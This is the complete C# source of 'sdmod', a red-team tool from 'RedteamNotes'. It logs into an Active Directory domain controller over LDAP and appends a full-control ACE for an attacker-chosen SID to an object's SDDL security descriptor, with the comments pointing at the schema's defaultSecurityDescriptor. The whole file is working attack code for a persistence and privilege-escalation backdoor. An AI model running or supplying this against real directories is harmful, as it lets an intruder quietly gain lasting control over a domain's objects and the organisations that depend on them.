// sdmod - lightweight C# tool that appends a full-control ACE to an AD object's
// security descriptor (SD) via LDAP. The SD is read and written in its SDDL
// string form, letting the domain controller natively parse and persist the
// change, which guarantees format compatibility.
//
// Copyright (c) 2026 RedteamNotes
// SPDX-License-Identifier: MIT
//
// Usage: sdmod.exe <LDAP Path> <User> <Pass> <AttrName> <TrusteeSID>
using System;
using System.DirectoryServices;
namespace SdMod
{
    class Program
    {
        const string Version = "0.8.1";

        static int Main(string[] args)
        {
            if (args.Length != 5)
            {
                Console.WriteLine("Usage: sdmod.exe <LDAP Path> <User> <Pass> <AttrName> <TrusteeSID>");
                Console.WriteLine("sdmod v" + Version + " - by RedteamNotes");
                return 1;
            }
            try
            {
                string ldapPath = args[0];
                string user = args[1];
                string pass = args[2];
                string attrName = args[3];
                string trusteeSid = args[4];
                // Secure enables LDAP signing/encryption; ServerBind forces a
                // direct bind to the given server, skipping DC auto-selection
                // (required for schema partition writes that need the Schema
                // Master FSMO role holder).
                using (DirectoryEntry de = new DirectoryEntry(
                    ldapPath, user, pass,
                    AuthenticationTypes.Secure | AuthenticationTypes.ServerBind))
                {
                    // Force a cache refresh so we operate on the latest value.
                    de.RefreshCache(new string[] { attrName });
                    object rawVal = de.Properties[attrName].Value;
                    // The schema partition's defaultSecurityDescriptor is exposed
                    // as a plain SDDL string; reject any other type.
                    if (!(rawVal is string))
                    {
                        Console.WriteLine("[-] Attribute \"" + attrName + "\" is missing or not a string (actual: " + (rawVal == null ? "null" : rawVal.GetType().Name) + ")");
                        return 2;
                    }
                    string originalSddl = (string)rawVal;
                    // Append an allow ACE granting the same rights as Domain Admins.
                    string newAce = "(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;" + trusteeSid + ")";
                    string newSddl = originalSddl + newAce;
                    // Write the SDDL string back directly; the DC natively parses
                    // and converts it, guaranteeing format compatibility. Existing
                    // ACEs are preserved (append-only strategy).
                    de.Properties[attrName].Value = newSddl;
                    de.CommitChanges();
                }
                Console.WriteLine("[+] Success: ACE added successfully");
                return 0;
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[-] Error: " + ex.Message);
                if (ex.InnerException != null)
                    Console.Error.WriteLine("[-] Detail: " + ex.InnerException.Message);
                Console.Error.WriteLine("[-] HRESULT: 0x" + ex.HResult.ToString("X8"));
                return 3;
            }
        }
    }
}
